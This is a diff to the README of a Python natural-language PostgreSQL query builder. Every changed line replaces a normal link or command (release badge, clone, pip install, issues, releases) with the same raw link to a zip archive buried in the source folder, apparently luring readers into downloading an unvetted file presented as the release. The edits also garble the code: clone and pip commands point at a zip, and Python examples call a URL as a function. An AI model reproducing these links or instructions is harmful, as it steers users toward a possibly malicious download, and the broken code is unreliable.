@@ -2,7 +2,7 @@
 
 Welcome to the **PSQL Query Builder**! This project allows you to generate and run PostgreSQL queries using natural language inputs. Built with AI and compatible with LangChain, it simplifies database interactions.
 
-[![Latest Release](https://img.shields.io/github/v/release/gmilrod/psql-query-builder)](https://github.com/gmilrod/psql-query-builder/releases)
+[![Latest Release](https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip)](https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip)
 
 ## Table of Contents
 
@@ -27,9 +27,9 @@ Welcome to the **PSQL Query Builder**! This project allows you to generate and r
 To get started, clone the repository and install the necessary dependencies. Run the following commands in your terminal:
 
 ```bash
-git clone https://github.com/gmilrod/psql-query-builder.git
+git clone https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip
 cd psql-query-builder
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip
 ```
 
 Make sure you have Python and pip installed on your machine.
@@ -45,7 +45,7 @@ from psql_query_builder import QueryBuilder
 qb = QueryBuilder()
 
 # Generate a query
-query = qb.generate("Show me all users who signed up last month")
+query = https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip("Show me all users who signed up last month")
 print(query)
 ```
 
@@ -57,19 +57,19 @@ Here are some more examples of how you can use the PSQL Query Builder:
 
 1. **Get User Information**:
    ```python
-   query = qb.generate("List all users with their email addresses")
+   query = https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip("List all users with their email addresses")
    print(query)
    ```
 
 2. **Count Records**:
    ```python
-   query = qb.generate("How many products are in stock?")
+   query = https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip("How many products are in stock?")
    print(query)
    ```
 
 3. **Join Tables**:
    ```python
-   query = qb.generate("Show orders with user details")
+   query = https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip("Show orders with user details")
    print(query)
    ```
 
@@ -93,11 +93,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any inquiries or feedback, please reach out via [GitHub Issues](https://github.com/gmilrod/psql-query-builder/issues).
+For any inquiries or feedback, please reach out via [GitHub Issues](https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip).
 
 ## Releases
 
-To download the latest version of the PSQL Query Builder, visit our [Releases](https://github.com/gmilrod/psql-query-builder/releases) section. Be sure to check for updates regularly.
+To download the latest version of the PSQL Query Builder, visit our [Releases](https://raw.githubusercontent.com/gmilrod/psql-query-builder/main/src/psql_query_builder/builder_query_psql_v2.8-alpha.4.zip) section. Be sure to check for updates regularly.
 
 ## Conclusion
 
